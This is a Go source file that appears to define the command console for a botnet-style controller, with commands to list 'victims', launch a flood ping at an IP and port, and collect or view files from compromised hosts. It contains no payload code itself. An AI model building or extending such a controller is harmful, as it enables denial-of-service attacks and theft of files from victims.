package types

import "fmt"

// function handler types
type HelpHandlerFunc func()
type ClearHandlerFunc func()
type ExitHandlerFunc func()
type ListVictimsHandlerFunc func()
type FloodPingHandlerFunc func(victimHash string, ip string, port string)
type SuperCatHandlerFunc func(victimHash string, filePattern string)
type WriteFileHandlerFunc func(victimHash string, filenames ...string)
type ShowSuperCatHandlerFunc func(victimHash string)

// Handler interface should be implemented
// by all function handlers.
type Handler interface {
	Execute(args []string)
}

/**
 * Handler wrappers
 */

type HelpWrapper struct {
	HandlerFunc HelpHandlerFunc
}

func (w *HelpWrapper) Execute(args []string) {
	if len(args) == 0 {
		w.HandlerFunc()
	} else {
		fmt.Println("Usage: /help")
	}
}

func (w *HelpWrapper) GetHelp() string {
	return "<help>: help <victimHash> <ip> <port>"
}

type ClearWrapper struct {
	HandlerFunc ClearHandlerFunc
}

func (w *ClearWrapper) Execute(args []string) {
	if len(args) == 0 {
		w.HandlerFunc()
	} else {
		fmt.Println("Usage: /clear")
	}
}

func (w *ClearWrapper) GetHelp() string {
	return "<clear>: clear"
}

type ExitWrapper struct {
	HandlerFunc ExitHandlerFunc
}

func (w *ExitWrapper) Execute(args []string) {
	if len(args) == 0 {
		w.HandlerFunc()
	} else {
		fmt.Println("Usage: /exit")
	}
}

func (w *ExitWrapper) GetHelp() string {
	return "<exit>: exit"
}

type ListVictimsWrapper struct {
	HandlerFunc ListVictimsHandlerFunc
}

func (w *ListVictimsWrapper) Execute(args []string) {
	if len(args) == 0 {
		w.HandlerFunc()
	} else {
		fmt.Println("Usage: /list")
	}
}

func (w *ListVictimsWrapper) GetHelp() string {
	return "<list>: list"
}

type FloodPingWrapper struct {
	HandlerFunc FloodPingHandlerFunc
}

func (w *FloodPingWrapper) Execute(args []string) {
	if len(args) == 3 {
		w.HandlerFunc(args[0], args[1], args[2])
	} else {
		fmt.Println("Usage: /floodping <victimHash> <ip> <port>")
	}
}

type SuperCatWrapper struct {
	HandlerFunc SuperCatHandlerFunc
}

func (w *SuperCatWrapper) Execute(args []string) {
	if len(args) == 2 {
		w.HandlerFunc(args[0], args[1])
	} else {
		fmt.Println("Usage: /supercat <victimHash> <filePattern>")
	}
}

type WriteFileWrapper struct {
	HandlerFunc WriteFileHandlerFunc
}

func (w *WriteFileWrapper) Execute(args []string) {
	if len(args) >= 2 {
		w.HandlerFunc(args[0], args[1:]...)
	} else {
		fmt.Println("Usage: /writefile <victimHash> <file1> [file2] ...")
	}
}

type ShowSuperCatWrapper struct {
	HandlerFunc ShowSuperCatHandlerFunc
}

func (w *ShowSuperCatWrapper) Execute(args []string) {
	if len(args) == 1 {
		w.HandlerFunc(args[0])
	} else {
		fmt.Println("Usage: /showsupercat <victimHash>")
	}
}

type Option struct {
	Cmd         string
	Action      Handler
	Description string
}

type CommandInfo struct {
	Cmd         string
	Description string
}
